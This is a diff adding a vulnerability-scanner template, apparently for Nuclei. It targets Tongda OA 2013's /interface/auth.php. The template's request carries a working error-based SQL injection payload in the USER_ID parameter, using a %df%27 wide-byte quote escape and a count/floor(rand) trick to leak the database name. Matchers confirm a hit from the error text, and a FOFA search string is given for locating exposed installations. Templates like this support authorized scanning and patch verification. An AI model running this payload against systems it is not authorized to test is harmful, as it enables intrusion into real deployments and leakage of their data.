@@ -1,0 +1,32 @@
+id: tongda-oa-auth-sql
+
+info:
+  name: 通达OA 2013 /interface/auth.php 报错注入
+  author: linuxlz
+  severity: critical
+  description: 通达OA 2013 /interface/auth.php 报错注入
+  reference:
+    - https://mp.weixin.qq.com/s/6ajtYnyBSzcZrATQp_0i5A
+  metadata:
+    fofa-query: "Office Anywhere 2013"
+  tags: tongda,oa,sql
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/interface/auth.php?&PASSWORD=1&USER_ID=%df%27 and (select 1 from (select count(*),concat((select concat(0x3a,(select database()) ,0x3a) from user limit 1),floor(rand(0)*2))x from  information_schema.tables group by x)a)%23" 
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - "错误#1062:"
+          - "SQL语句:"
+          - ":td_oa:1"
+        condition: and 
